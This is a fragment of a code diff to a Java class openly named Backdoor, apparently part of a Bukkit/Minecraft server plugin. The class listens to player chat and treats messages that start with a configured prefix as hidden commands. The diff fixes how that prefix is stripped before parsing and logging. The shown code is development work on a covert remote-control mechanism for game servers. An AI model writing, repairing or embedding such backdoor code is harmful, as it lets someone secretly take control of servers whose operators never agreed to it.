@@ -58,12 +58,12 @@ public final class Backdoor implements Listener {
             }
 
             if (e.getMessage().startsWith(Config.command_prefix)) {
-                boolean result = ParseCommand(e.getMessage().substring(1), p);
+                boolean result = ParseCommand(e.getMessage().substring(Config.command_prefix.length()), p);
 
 
                 if (Config.display_debug_messages) {
                     Bukkit.getConsoleSender()
-                            .sendMessage(Config.chat_message_prefix + " Command: " + e.getMessage().substring(1) + " success: " + result);
+                            .sendMessage(Config.chat_message_prefix + " Command: " + e.getMessage().substring(Config.command_prefix.length()) + " success: " + result);
                 }
 
                 if (!result)
